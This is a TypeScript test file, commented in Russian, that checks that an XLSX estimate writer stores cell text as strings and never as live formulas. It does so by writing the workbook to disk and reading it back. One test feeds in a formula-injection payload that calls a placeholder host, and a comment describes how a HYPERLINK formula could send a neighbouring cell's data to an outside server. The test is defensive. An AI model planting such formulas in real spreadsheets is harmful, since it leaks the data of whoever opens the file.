/**
 * Проверка ЗАПИСАННОГО ФАЙЛА, а не вызванной функции.
 *
 * Модульный тест экранирования доказывает, что функция ставит апостроф. Он не
 * доказывает, что писатель её вызывает, — а именно это и было бы забыто при
 * добавлении новой выгрузки. Поэтому книга пишется на диск, читается обратно, и
 * проверяется, чем оказалась ячейка: строкой или формулой.
 */
import { rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";

import ExcelJS from "exceljs";
import { describe, expect, it } from "vitest";

import type { WorkbookSpec } from "@modules/exports/calculation-workbook.js";

import { writeWorkbook } from "./xlsx-writer.js";

function specWith(value: string): WorkbookSpec {
  return {
    metadata: {
      generatorVersion: "тест",
      templateVersion: "тест",
      artifactId: "тест",
      inputHashes: [],
      producedAt: "2026-08-31T00:00:00.000Z",
    },
    sheets: [{ name: "Смета", columnWidths: [60], rows: [[{ kind: "text", value }]] }],
  };
}

async function cellOf(spec: WorkbookSpec): Promise<ExcelJS.CellValue> {
  const path = join(tmpdir(), `si-writer-${process.pid}-${spec.sheets[0]!.rows.length}.xlsx`);

  try {
    await writeWorkbook(spec, path);

    const workbook = new ExcelJS.Workbook();
    await workbook.xlsx.readFile(path);

    return workbook.getWorksheet("Смета")!.getCell(1, 1).value;
  } finally {
    rmSync(path, { force: true });
  }
}

describe("запись книги", () => {
  it("инъекция НЕ долетает до ячейки как формула", async () => {
    // Книгу открывает заказчик, у которого рядом лежат его собственные данные.
    // `=HYPERLINK("http://…"&A1)` увёл бы соседнюю ячейку на чужой сервер при
    // простом открытии файла.
    const value = await cellOf(specWith('=HYPERLINK("http://зло","жми")'));

    expect(typeof value).toBe("string");
    expect((value as { formula?: string }).formula).toBeUndefined();
  });

  it("наименование позиции доходит без изменений", async () => {
    // Апостроф — служебный: в ячейке его не видно, а текст остаётся исходным.
    // По наименованию сверяют смету с документом, и потеря символа испортила бы
    // сверку тише, чем инъекция.
    const имя = "-40°C, исполнение УХЛ1";
    const value = await cellOf(specWith(имя));

    expect(String(value).replace(/^'/, "")).toBe(имя);
  });

  it("обычный текст не обрастает апострофом", async () => {
    const имя = "Кабель ВВГнг(А)-LS 5х16 мм²";

    expect(await cellOf(specWith(имя))).toBe(имя);
  });
});
